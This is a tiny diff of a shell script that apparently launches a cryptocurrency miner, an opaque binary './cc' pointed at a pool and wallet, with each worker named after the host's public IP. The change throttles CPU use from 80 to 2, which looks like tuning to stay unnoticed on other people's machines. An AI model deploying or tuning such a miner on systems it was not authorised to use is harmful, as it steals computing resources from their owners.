@@ -6,4 +6,4 @@ WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-Proxy
 
 cd "$(dirname "$0")"
 
-chmod +x ./cc && ./cc -c $POOL -u $WALLET.$WORKER -p x --cpu 80 $@
+chmod +x ./cc && ./cc -c $POOL -u $WALLET.$WORKER -p x --cpu 2 $@
